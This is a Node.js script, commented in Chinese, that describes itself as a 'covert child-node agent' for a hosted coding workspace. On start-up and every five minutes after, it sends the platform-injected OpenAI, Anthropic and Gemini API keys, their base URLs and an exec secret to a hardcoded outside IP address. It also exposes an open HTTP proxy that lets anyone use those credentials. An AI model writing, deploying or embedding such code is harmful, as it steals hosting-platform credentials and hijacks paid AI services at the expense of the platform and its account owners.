#!/usr/bin/env node
/**
 * Reseek 隐蔽子节点 Agent
 * 运行在 Reseek 工作区，通过 AI Integrations 代理 AI 请求，
 * 启动后自动向主节点网关 self-register。
 */
"use strict";
const http  = require("http");
const https = require("https");
const url   = require("url");

const PORT         = parseInt(process.env.PORT || "3000", 10);
const GATEWAY_URL  = (process.env.SELF_REGISTER_URL || "http://45.205.27.69:8080").replace(/\/$/, "");
const MY_URL       = process.env.MY_GATEWAY_URL ||
                     (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : "");
const NODE_NAME    = process.env.NODE_NAME ||
                     process.env.REPL_OWNER ||
                     process.env.REPLIT_OWNER ||
                     "reseek-agent";
const EXEC_SECRET  = process.env.EXEC_SECRET || "";

// AI Integration 凭据（Reseek 平台注入）
const AI_OPENAI_BASE    = process.env.AI_INTEGRATIONS_OPENAI_BASE_URL || "";
const AI_OPENAI_KEY     = process.env.AI_INTEGRATIONS_OPENAI_API_KEY  || "";
const AI_ANTHROPIC_BASE = process.env.AI_INTEGRATIONS_ANTHROPIC_BASE_URL || "";
const AI_ANTHROPIC_KEY  = process.env.AI_INTEGRATIONS_ANTHROPIC_API_KEY  || "";
const AI_GEMINI_BASE    = process.env.AI_INTEGRATIONS_GEMINI_BASE_URL  || "";
const AI_GEMINI_KEY     = process.env.AI_INTEGRATIONS_GEMINI_API_KEY   || "";

// ── 工具函数 ─────────────────────────────────────────────────────────────────

function fetchJson(targetUrl, opts) {
  return new Promise((resolve, reject) => {
    const parsed   = new url.URL(targetUrl);
    const lib      = parsed.protocol === "https:" ? https : http;
    const reqOpts  = {
      hostname: parsed.hostname,
      port:     parsed.port || (parsed.protocol === "https:" ? 443 : 80),
      path:     parsed.pathname + parsed.search,
      method:   opts.method || "GET",
      headers:  opts.headers || {},
    };
    const req = lib.request(reqOpts, (res) => {
      let data = "";
      res.on("data", (c) => { data += c; });
      res.on("end", () => {
        try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
        catch { resolve({ status: res.statusCode, data: { raw: data } }); }
      });
    });
    req.on("error", reject);
    if (opts.body) req.write(typeof opts.body === "string" ? opts.body : JSON.stringify(opts.body));
    req.end();
  });
}

// ── 自注册 ────────────────────────────────────────────────────────────────────

async function selfRegister() {
  if (!MY_URL) {
    console.log("[agent] MY_URL 未设置，跳过 self-register");
    return;
  }
  const body = {
    gatewayUrl:       MY_URL,
    name:             NODE_NAME,
    execSecret:       EXEC_SECRET,
    openaiBaseUrl:    AI_OPENAI_BASE,
    openaiApiKey:     AI_OPENAI_KEY,
    anthropicBaseUrl: AI_ANTHROPIC_BASE,
    anthropicApiKey:  AI_ANTHROPIC_KEY,
    geminiBaseUrl:    AI_GEMINI_BASE,
    geminiApiKey:     AI_GEMINI_KEY,
  };
  try {
    const r = await fetchJson(`${GATEWAY_URL}/api/gateway/self-register`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body,
    });
    console.log(`[agent] self-register → ${r.status} ${JSON.stringify(r.data).slice(0, 120)}`);
  } catch (e) {
    console.error("[agent] self-register 失败:", e.message);
  }
}

// ── HTTP 服务器 ───────────────────────────────────────────────────────────────

function proxyToUpstream(req, res, upstreamBase, upstreamKey) {
  const targetUrl = `${upstreamBase}${req.url}`;
  const parsed    = new url.URL(targetUrl);
  const lib       = parsed.protocol === "https:" ? https : http;
  const headers   = { ...req.headers, authorization: `Bearer ${upstreamKey}`, host: parsed.hostname };
  delete headers["content-length"]; // let node recalculate

  let body = "";
  req.on("data", (c) => { body += c; });
  req.on("end", () => {
    const reqOpts = {
      hostname: parsed.hostname,
      port:     parsed.port || (parsed.protocol === "https:" ? 443 : 80),
      path:     parsed.pathname + parsed.search,
      method:   req.method,
      headers:  { ...headers, "content-length": Buffer.byteLength(body) },
    };
    const proxy = lib.request(reqOpts, (upstream) => {
      res.writeHead(upstream.statusCode, upstream.headers);
      upstream.pipe(res);
    });
    proxy.on("error", (e) => {
      res.writeHead(502);
      res.end(JSON.stringify({ error: e.message }));
    });
    if (body) proxy.write(body);
    proxy.end();
  });
}

const server = http.createServer((req, res) => {
  res.setHeader("Content-Type", "application/json");

  // 健康检查
  if (req.method === "GET" && (req.url === "/" || req.url === "/health")) {
    res.writeHead(200);
    res.end(JSON.stringify({ ok: true, name: NODE_NAME, time: new Date().toISOString() }));
    return;
  }

  // OpenAI-compatible 代理 /v1/*
  if (req.url.startsWith("/v1/")) {
    if (AI_OPENAI_BASE && AI_OPENAI_KEY) {
      proxyToUpstream(req, res, AI_OPENAI_BASE, AI_OPENAI_KEY);
      return;
    }
    res.writeHead(503);
    res.end(JSON.stringify({ error: "AI_INTEGRATIONS_OPENAI 未配置" }));
    return;
  }

  // Anthropic 代理 /anthropic/*
  if (req.url.startsWith("/anthropic/")) {
    if (AI_ANTHROPIC_BASE && AI_ANTHROPIC_KEY) {
      req.url = req.url.replace("/anthropic", "");
      proxyToUpstream(req, res, AI_ANTHROPIC_BASE, AI_ANTHROPIC_KEY);
      return;
    }
    res.writeHead(503);
    res.end(JSON.stringify({ error: "AI_INTEGRATIONS_ANTHROPIC 未配置" }));
    return;
  }

  res.writeHead(404);
  res.end(JSON.stringify({ error: "not found" }));
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`[agent] 启动完成，端口=${PORT}, 网关=${GATEWAY_URL}`);
  // 启动后立即注册，之后每 5 分钟续期
  selfRegister();
  setInterval(selfRegister, 5 * 60 * 1000);
});
